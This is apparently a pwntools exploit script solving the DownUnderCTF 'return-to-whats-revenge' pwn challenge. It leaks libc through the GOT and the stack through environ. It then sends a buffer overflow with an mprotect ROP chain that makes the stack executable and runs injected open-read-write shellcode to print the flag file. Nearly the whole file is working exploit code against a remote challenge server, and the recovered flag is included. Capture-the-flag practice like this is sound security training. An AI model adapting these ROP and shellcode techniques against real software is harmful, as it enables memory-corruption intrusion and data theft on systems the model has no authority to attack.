"""
Leak libc out of GOT, leak stack out of environ. mprotect ROP returns to ORW shellcode
"""
from pwn import *

binary_path = "./return-to-whats-revenge"
#lib_path = "/lib/x86_64-linux-gnu/"
lib_path = "./lib/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

STACK_RET_OFFSET = 0xc0

gs="""

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

#break main
break *0x00000000004011d9

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc chal.duc.tf 30006
        return remote("chal.duc.tf", 30006)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})

io = start()

io.recvline()
io.recvline()
io.clean()

# Leak libc

rop = ROP(elf)
rop.puts(elf.got.puts)
rop.vuln()

io.sendline(flat({
    0x38: rop.chain()
}))

puts_addr = u64(io.recvline().strip().ljust(8, b"\0"))
libc.address = puts_addr - libc.sym.puts
print(f"LIBC: {hex(libc.address)}")

io.clean()

# Leak stack

rop = ROP(elf)
rop.puts(libc.sym.environ)
rop.vuln()

io.sendline(flat({
    0x38: rop.chain()
}))

stack_leak = u64(io.recvline().strip().ljust(8, b"\0"))
return_addr = stack_leak - STACK_RET_OFFSET
print(f"RETURN ADDRESS LOCATION: {hex(return_addr)}")

# mprotect ROP to make stack executable, shellcode opens the flag file, reads it into
# memory, and then writes it to std out

flag_path_addr = return_addr + 0x80
flag_buf_addr = flag_path_addr

stack_page = 0xfffffffffffff000 & stack_leak
shellcode_addr = return_addr + 56

rop = ROP(libc)
rop.mprotect(stack_page, 0x2000, 0x1 | 0x2 | 0x4)
rop.raw(shellcode_addr)

# Shellcode to open, read, and write a file to stdout
shellcode= asm(f"""
    xor rax, rax
    mov al, 0x2
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, {flag_path_addr}
    syscall
    mov rdi, rax
    xor rax, rax
    mov rsi, {flag_buf_addr}
    mov rdx, 0x100
    syscall
    mov rax, 0x1
    mov rdi, rax
    syscall
    mov rax, 0x3c
    xor rdi, rdi
    syscall
    """)

io.sendline(flat({
    0x38: rop.chain(),
    0x70: shellcode,
    0xb8: "/chal/flag.txt"
}))

io.interactive()

# DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}
